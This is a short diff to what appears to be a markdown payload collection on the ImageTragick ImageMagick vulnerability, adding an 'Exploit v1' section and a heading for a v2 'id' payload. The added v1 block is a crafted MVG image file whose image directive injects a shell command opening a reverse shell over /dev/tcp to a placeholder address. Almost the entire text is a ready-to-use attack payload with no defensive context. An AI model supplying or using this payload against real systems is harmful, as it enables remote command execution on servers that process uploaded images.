@@ -1,6 +1,22 @@
-# Image Tragik 2
+# Image Tragik 1 & 2
 
-## Exploit
+
+## Exploit v1
+
+Simple reverse shell
+
+```powershell
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'
+pop graphic-context
+pop graphic-context
+```
+
+## Exploit v2
 
 Simple `id` payload
 
